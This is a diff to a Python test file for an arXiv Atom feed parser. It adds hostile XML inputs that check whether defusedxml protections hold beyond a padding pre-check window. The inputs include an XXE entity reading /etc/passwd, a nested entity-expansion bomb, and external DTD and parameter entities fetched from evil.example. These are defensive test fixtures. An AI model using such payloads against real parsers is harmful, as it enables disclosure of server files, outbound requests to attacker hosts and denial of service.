@@ -24,6 +24,7 @@ PROBE = KnowledgeQuery("optimal filtering", 5)
 INVALID_XML = ProviderError(ProviderErrorKind.MALFORMED_RESPONSE, "invalid_xml")
 TOO_LARGE = ProviderError(ProviderErrorKind.RESPONSE_TOO_LARGE, "too_large")
 FEED_OPEN = '<feed xmlns="http://www.w3.org/2005/Atom">'
+PAD = f"<!--{' ' * 5000}-->"
 ENTRY = "<entry><id>http://arxiv.org/abs/2109.05124v2</id><title>{title}</title></entry>"
 
 
@@ -83,9 +84,30 @@ HOSTILE_DOCUMENTS = {
         f"{FEED_OPEN}{ENTRY.format(title='&a;' * 2000)}</feed>"
     ),
     "doctype-after-the-precheck-window": (
-        f"<!--{' ' * 5000}-->"
+        f"{PAD}"
         '<!DOCTYPE feed [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
         f"{FEED_OPEN}{ENTRY.format(title='&xxe;')}</feed>"
+    ),
+    # Beyond the byte pre-check window only the defusedxml flags stand in the way: these four
+    # parse successfully (and expand) when ``forbid_dtd``, ``forbid_entities`` and
+    # ``forbid_external`` are all lowered, unlike the file entity above, which expat refuses
+    # on its own.
+    "padded-billion-laughs": (
+        f"{PAD}"
+        '<!DOCTYPE feed [<!ENTITY a "aaaaaaaaaa">'
+        '<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">]>'
+        f"{FEED_OPEN}{ENTRY.format(title='&b;')}</feed>"
+    ),
+    "padded-internal-entity": (
+        f'{PAD}<!DOCTYPE feed [<!ENTITY a "x">]>{FEED_OPEN}{ENTRY.format(title="&a;")}</feed>'
+    ),
+    "padded-external-dtd": (
+        f'{PAD}<!DOCTYPE feed SYSTEM "https://evil.example/feed.dtd">'
+        f"{FEED_OPEN}{ENTRY.format(title='x')}</feed>"
+    ),
+    "padded-parameter-entity": (
+        f'{PAD}<!DOCTYPE feed [<!ENTITY % remote SYSTEM "https://evil.example/p.dtd"> %remote;]>'
+        f"{FEED_OPEN}{ENTRY.format(title='x')}</feed>"
     ),
     "undeclared-entity": f"{FEED_OPEN}{ENTRY.format(title='&undeclared;')}</feed>",
 }
